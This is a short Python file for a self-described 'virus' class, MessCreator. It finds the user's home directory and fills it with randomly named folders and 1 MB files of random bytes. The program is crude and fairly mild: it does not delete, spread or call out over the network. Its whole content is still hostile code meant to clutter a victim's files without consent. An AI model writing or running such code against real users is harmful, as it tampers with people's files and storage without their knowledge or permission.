import os
import uuid
from random import randint


class MessCreator:
    is_first_run = True

    def __init__(self, home=None):
        self.home = home

        self.dirs_made = []
        print('The virus initiated')
        self._detect_home_directory(home)

    def _detect_home_directory(self, special_dir=None):
        self.home = os.path.expanduser('~')
        if special_dir:
            self.home += f'/{special_dir}'
        print(f'Home directory detected at {self.home}')

    def mess_with_files(self):
        # create file in home dir
        one_mb = 1024*1024
        for _ in range(3):
            random_name = str(uuid.uuid4())
            path = f'{self.home}/{random_name}'
            with open(path, 'wb') as file:
                file.write(os.urandom(one_mb))
        # create files in nested dirs
        for _ in range(3):
            random_name = str(uuid.uuid4())
            random_path = self.dirs_made[randint(0, len(self.dirs_made)) - 1]
            file_path = f'{random_path}/{random_name}'
            with open(file_path, 'wb') as file:
                file.write(os.urandom(one_mb))

    def mess_with_directories(self):
        # create files in home dir
        for _ in range(3):
            random_name = str(uuid.uuid4())
            dir_path = f'{self.home}/{random_name}'
            os.makedirs(dir_path)
            self.dirs_made.append(dir_path)
        # create files in nested dir
        dir_to_nest = self.dirs_made[randint(0, len(self.dirs_made)) - 1]
        os.makedirs(f'{dir_to_nest}/{str(uuid.uuid4())}')
